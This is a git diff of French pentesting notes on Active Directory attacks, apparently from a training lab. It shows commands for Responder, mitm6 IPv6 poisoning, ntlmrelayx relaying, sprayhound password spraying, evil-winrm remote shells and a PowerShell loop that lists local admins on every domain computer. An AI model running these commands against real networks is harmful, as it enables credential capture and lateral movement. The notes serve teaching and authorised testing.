@@ -418,7 +418,7 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 
 <br>
 
-### Responder
+## Responder
 
 Quand une machine Windows cherche une ressource (ex: \\SERVEUR ou http://intranet) et que le DNS ne répond pas ou n’est pas utilisé, elle diffuse une requête locale. Responder se fait alors passer pour la ressource demandée. <br>
 Si la machine tente de s’y connecter, elle envoie une authentification NTLM mais responder ne l'expoite pas directement, il capture le challenge/réponse NTLM permettant de d'intercepter le hash au passage.
@@ -471,24 +471,31 @@ __Chemin des logs Responder :__
 
 <br>
 
-### mitm6
+## Mitm6
 
 Mitm6 est un outil d’empoisonnement IPv6, principalement conçu pour les réseaux Active Directory mal configurés en envoyant de faux messages comme 'Router Advertissement' (*RA*) ou en répondant au DNS IPv6 (et parfois DHCPv6). Les postes acceptent ces annonces permmetant d'utiliser l'attaquant comme DNS IPv6, en cherchant un proxy (*WPAD*) ou en s'authentifiant via NTLM vers des services controlés par l'attaquant.
 
 Il sert principalment à provoquer des authentifications NTLM qui sont ensuite capturées par Responder ou relayées par ntlmrelayx, cependant mitm6 capture aussi beaucoup de comptes mahines difficilements exploitables. (+ 120 caractères)
 
-Installer mitm6 (python3 requis)
+
+### Installer et Lancer mitm6 
+
+Puis lancer Responder (python3 requis pour mitm6). (on peut cibler juste un serveur, une gareway ou un DC...) 
 ```sh
 sudo apt install mitm6
-```
-
-Lancer mitm6 puis lancer Responder
-```sh
 sudo mitm6 -d <domain.name>
 sudo responder -I eth0 
 ```
 
-mitm6 agit en amont : il force les machines à parler, là où Responder attend qu’elles parlent.
+Dépannage
+```sh
+ps aux | grep mitm6
+pgrep mitm6
+sudo pkill mitm6
+```
+
+
+__*mitm6 agit en amont : il force les machines à parler, là où Responder attend qu’elles parlent.*__
 
 
 
@@ -516,6 +523,7 @@ ntlmrelayx.py -t ldap://dc.domaine.local
 
 
 INC.
+
 
 
 ---
@@ -568,6 +576,16 @@ sudo evil-winrm -i 10.0.0.1 -u '<UserName>@<Domain-Name>' -p '<password>'
 ```
 
 ![img](img/evil.png)
+
+
+### Comptes admin locaux 
+
+Vérifier sur quelles machines trouver des utlisateurs du domaine qui sont admin de leur machines
+```powershell
+$pcs = Get-ADComputer -Filter * | Select -ExpandProperty Name
+Invoke-Command -ComputerName $pcs -ScriptBlock { Get-LocalGroupMember Administrateurs }
+```
+
 
 ### Afficher la description d'un compte
 ```powershell
